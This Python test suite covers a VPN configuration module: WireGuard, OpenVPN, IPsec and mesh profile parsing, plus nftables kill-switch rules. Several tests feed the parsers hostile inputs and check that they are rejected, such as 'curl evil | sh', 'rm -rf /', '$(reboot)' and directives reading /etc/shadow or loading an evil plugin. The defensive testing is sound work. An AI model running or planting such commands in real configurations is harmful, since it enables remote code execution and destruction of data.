import ipaddress
import os
import shutil
import subprocess
import tempfile
import unittest

from features.vpn import guard, ipsec, mesh, model, openvpn, wireguard

PRIVATE, PUBLIC = wireguard.keypair()
SERVER_PRIVATE, SERVER_PUBLIC = wireguard.keypair()
WG = f"""[Interface]
PrivateKey = {PRIVATE}
Address = 10.8.0.2/32
DNS = 10.8.0.1
[Peer]
PublicKey = {SERVER_PUBLIC}
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
"""
OVPN = """client
dev tun
proto udp
remote vpn.example.org 1194
remote 203.0.113.10 443
cipher AES-256-GCM
auth-user-pass
<ca>
-----BEGIN CERTIFICATE-----
MIIBszCCAVmgAwIBAgIUQ0FUQQ==
-----END CERTIFICATE-----
</ca>
<tls-crypt>
-----BEGIN OpenVPN Static key V1-----
00112233445566778899aabbccddeeff
-----END OpenVPN Static key V1-----
</tls-crypt>
"""


class SplitTests(unittest.TestCase):

    def test_exclude_routes_everything_but_the_holes(self):
        routes = model.routes(model.split({"mode": "exclude", "networks": ["192.168.0.0/16", "8.8.8.8/32"]}))
        nets = [ipaddress.ip_network(r) for r in routes]
        self.assertFalse(any(ipaddress.ip_address("192.168.1.1") in n for n in nets))
        self.assertFalse(any(ipaddress.ip_address("8.8.8.8") in n for n in nets))
        self.assertTrue(any(ipaddress.ip_address("1.1.1.1") in n for n in nets))
        self.assertIn("::/0", routes)

    def test_include_and_all(self):
        self.assertEqual(model.routes(model.split({"mode": "include", "networks": "10.0.0.0/8"})), ["10.0.0.0/8"])
        self.assertEqual(model.routes(model.split({})), ["0.0.0.0/0", "::/0"])
        with self.assertRaises(ValueError):
            model.split({"mode": "include"})

    def test_profiles_are_validated(self):
        with self.assertRaises(ValueError):
            model.profile({"name": "x", "kind": "pptp"}, {})
        with self.assertRaises(ValueError):
            model.profile({"name": "x", "kind": "openvpn", "role": "server"}, {})
        with self.assertRaises(ValueError):
            model.profile({"name": "x; rm", "kind": "wireguard", "id": "../etc"}, {})
        self.assertEqual(model.endpoint("[2001:db8::1]:51820"), ("2001:db8::1", 51820))


class WireGuardTests(unittest.TestCase):

    def test_keys_match_and_bad_keys_are_rejected(self):
        self.assertEqual(wireguard.public_of(PRIVATE), PUBLIC)
        for bad in ("abc", "=" * 44, PUBLIC + "x"):
            with self.assertRaises(ValueError):
                wireguard.key(bad)

    def test_import_and_render_with_split(self):
        settings, secrets = wireguard.parse(WG)
        p = model.profile({"name": "Casa", "kind": "wireguard", "dns": settings.pop("dns"),
                           "split": {"mode": "exclude", "networks": ["192.168.1.0/24"]}},
                          {k: v for k, v in settings.items() if k != "allowed"})
        text = wireguard.render_client(p, secrets)
        self.assertIn(f"PrivateKey = {PRIVATE}", text)
        self.assertIn("Endpoint = vpn.example.com:51820", text)
        self.assertNotIn("0.0.0.0/0", text.split("AllowedIPs = ")[1].split("\n")[0])

    def test_command_hooks_are_refused(self):
        for line in ("PostUp = curl evil | sh", "PreDown = rm -rf /", "Table = off", "SaveConfig = true"):
            with self.subTest(line=line), self.assertRaises(ValueError):
                wireguard.parse(WG.replace("DNS = 10.8.0.1", line))

    def test_server_peers_get_unique_addresses_and_configs(self):
        settings = wireguard.server_settings({"subnet": "10.66.0.0/29", "public_host": "casa.example.net"})
        peers = [wireguard.add_peer(settings, f"telefono {i}") for i in range(5)]
        self.assertEqual(len({p["address"] for p, _ in peers}), 5)
        with self.assertRaises(ValueError):
            wireguard.add_peer(settings, "troppi")
        p = model.profile({"name": "Server", "kind": "wireguard", "role": "server", "dns": ["10.66.0.1"]}, settings)
        secrets = {"private_key": SERVER_PRIVATE, "peers": {peer["id"]: s for peer, s in peers}}
        server = wireguard.render_server(p, secrets)
        self.assertEqual(server.count("[Peer]"), 5)
        client = wireguard.render_peer(p, SERVER_PUBLIC, peers[0][0], peers[0][1], ["192.168.1.0/24"])
        self.assertIn("Endpoint = casa.example.net:51820", client)
        self.assertIn("AllowedIPs = 10.66.0.0/29, 192.168.1.0/24", client)
        with self.assertRaises(ValueError):
            wireguard.server_settings({"subnet": "8.8.8.0/24"})


class OpenVpnTests(unittest.TestCase):

    def test_safe_profile_is_kept_and_secrets_separated(self):
        settings, secrets = openvpn.sanitize(OVPN)
        self.assertEqual(settings["remotes"], ["vpn.example.org:1194", "203.0.113.10:443"])
        self.assertIn("tls-crypt", secrets["blocks"])
        self.assertNotIn("tls-crypt", settings["blocks"])
        p = model.profile({"name": "Lavoro", "kind": "openvpn", "split": {"mode": "include", "networks": ["10.20.0.0/16"]}}, settings)
        text = openvpn.render(p, secrets, "/etc/atena/vpn/x.auth")
        self.assertIn("script-security 0", text)
        self.assertIn(f"dev {p.interface}", text)
        self.assertIn("route 10.20.0.0 255.255.0.0 vpn_gateway", text)
        self.assertIn("auth-user-pass /etc/atena/vpn/x.auth", text)

    def test_dangerous_directives_are_refused(self):
        for evil in ("up /tmp/x.sh", "script-security 2", "plugin /lib/evil.so", "tls-verify /bin/sh", "ca /etc/shadow",
                     "config /etc/passwd", "management 0.0.0.0 7505", "dev tap0", "remote evil.com 1194; rm -rf /"):
            with self.subTest(evil=evil), self.assertRaises(ValueError):
                openvpn.sanitize(OVPN.replace("cipher AES-256-GCM", evil))
        with self.assertRaises(ValueError):
            openvpn.sanitize(OVPN.replace("MIIBszCCAVmgAwIBAgIUQ0FUQQ==", "$(reboot)"))


class IpsecAndMeshTests(unittest.TestCase):

    def test_ipsec_quotes_secrets_and_validates_identities(self):
        s = ipsec.settings({"server": "vpn.example.com", "auth": "eap", "username": "nunzio", "remote_id": "vpn.example.com"})
        p = model.profile({"name": "IKEv2", "kind": "ipsec"}, s)
        text = ipsec.render(p, {"secret": 'pa"ss\\word'})
        self.assertIn('secret = "pa\\"ss\\\\word"', text)
        self.assertIn("auth = eap-mschapv2", text)
        with self.assertRaises(ValueError):
            ipsec.settings({"server": "vpn.example.com", "auth": "psk", "local_id": "a b"})
        with self.assertRaises(ValueError):
            ipsec.secret("bad\nsecret")

    def test_tailscale_and_zerotier_commands_have_no_shell(self):
        p = model.profile({"name": "Mesh", "kind": "tailscale"},
                          mesh.tailscale_settings({"login_server": "https://hs.example.com", "exit_node": "100.64.0.1"}))
        args = mesh.tailscale_up(p, "/etc/atena/vpn/k")
        self.assertIn("--login-server=https://hs.example.com", args)
        self.assertIn("--auth-key=file:/etc/atena/vpn/k", args)
        with self.assertRaises(ValueError):
            mesh.zerotier_settings({"network_id": "zz; reboot"})
        with self.assertRaises(ValueError):
            mesh.tailscale_settings({"login_server": "http://insecure"})


class GuardTests(unittest.TestCase):

    def tunnel(self, **extra):
        p = model.profile({"name": "Casa", "kind": "wireguard", **extra}, {})
        return guard.Tunnel(p, (("203.0.113.1", 51820, "udp"),))

    def test_kill_switch_allows_tunnel_lan_and_endpoint_only(self):
        script = guard.compile_script([self.tunnel(kill_switch=True)])
        self.assertIn("ip daddr 203.0.113.1 udp dport 51820 accept", script)
        self.assertTrue(script.rstrip().endswith("}"))
        self.assertIn("counter reject", script)
        self.assertLess(script.index("udp dport 51820 accept"), script.index("udp dport { 53, 853 } counter drop"))

    def test_include_mode_protects_only_included_networks(self):
        script = guard.compile_script([self.tunnel(kill_switch=True, split={"mode": "include", "networks": ["10.20.0.0/16"]})])
        self.assertIn("ip daddr { 10.20.0.0/16 } counter reject", script)
        self.assertNotIn("53, 853", script)
        self.assertNotIn("        counter reject\n", script)

    def test_server_gets_forwarding_and_nat(self):
        settings = wireguard.server_settings({"subnet": "10.66.0.0/24"})
        p = model.profile({"name": "Server", "kind": "wireguard", "role": "server"}, settings)
        script = guard.compile_script([guard.Tunnel(p)])
        self.assertIn(f'ip saddr 10.66.0.0/24 oifname != "{p.interface}" masquerade', script)

    def test_nothing_active_removes_the_table(self):
        self.assertEqual(guard.compile_script([]).splitlines(), ["table inet atena_vpn", "delete table inet atena_vpn"])

    @unittest.skipUnless(shutil.which("nft") and hasattr(os, "geteuid") and os.geteuid() == 0, "serve nft come root")
    def test_scripts_are_accepted_by_nftables(self):
        settings = wireguard.server_settings({"subnet": "10.66.0.0/24"})
        server = guard.Tunnel(model.profile({"name": "Server", "kind": "wireguard", "role": "server"}, settings))
        ipsec_client = guard.Tunnel(model.profile({"name": "IKE", "kind": "ipsec", "kill_switch": True}, {}))
        script = guard.compile_script([self.tunnel(kill_switch=True), server, ipsec_client,
                                       self.tunnel(kill_switch=True, split={"mode": "include", "networks": ["fd00::/8"]})])
        script = script.replace("delete table inet atena_vpn\n", "", 1)
        with tempfile.NamedTemporaryFile("w", suffix=".nft", delete=False) as handle:
            handle.write(script)
        try:
            check = subprocess.run(["nft", "-c", "-f", handle.name], capture_output=True, text=True, timeout=20)
        finally:
            os.unlink(handle.name)
        self.assertEqual(check.returncode, 0, check.stderr + script)


if __name__ == "__main__":
    unittest.main()
